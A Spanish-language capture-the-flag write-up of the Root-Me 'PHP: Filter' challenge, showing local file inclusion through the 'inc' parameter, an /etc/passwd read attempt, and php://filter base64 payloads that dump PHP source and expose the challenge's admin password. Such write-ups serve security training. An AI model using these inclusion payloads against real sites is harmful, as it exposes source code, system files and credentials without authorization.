# Machine PHP: Filter

- La maquina tiene esta URL
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
```
- Al ver que tiene una variable, entonces se puede hacer un LFI, pero al ejecutar esto:
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=/etc/passwd
```
- No funciono, pero como el reto es **filter** y decido buscar informacion, en el cual la solución que me permitió ver la fuente de cualquier archivo PHP es usar esto **php://filter/convert.base64_encode/resource** y le pasamos el archivo para ver el codigo fuente que en este caso es **login.php** de esta manera
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=index.php
```
- Esto obliga a PHP a codificar en base64 el archivo antes de que se use en la instrucción require. Desde este punto, se trata de decodificar la cadena base64 para obtener el código fuente de los archivos PHP. Simple pero efectivo.
```
Ejemplo:

curl http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index

Resultado:

PD9waHAgZWNobygkX0dFVFsneCddKTsgLy8gT01HIHlvdSBib3RoZXJlZCB0byBkZWNvZGUgYmFzZSA2ND8gPz4=
```
- Una vez que tenga el código fuente para un archivo, puede inspeccionarlo para detectar vulnerabilidades adicionales, como inyecciones SQL y archivos PHP adicionales a los que se hace referencia mediante include o require_once.
- Al decifrar ese HASH en base64, este resultado
```
<?php include("ch12.php");?>
```
- Lo que hago es pasar ese archivo como variable asì
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=ch12.php
```
- Pero no funciona entonces uso otra vez el **filter**
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=ch12.php
```
- Me genera otro HASH base64 porque inicia con **PD9** entonces vamos a guardar ese HASH en un archivo para decodificarlo asì
```
$ cat code | base64 --decode > archivo
```
- Como resultado obtengo un codigo php y vamos usar otra vez **filter** para ver el codigo fuente del archivo **config** asì:
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
```
- Me genera otro HASH en base64 y lo vamos a decifrar en internet y el resultado es este
```
<?php

$username="admin";
$password="DAPt9D2mky0APAF";

?>
```
- Entonces la bandera es el **password**

# Write de reto PHP: Filter

https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
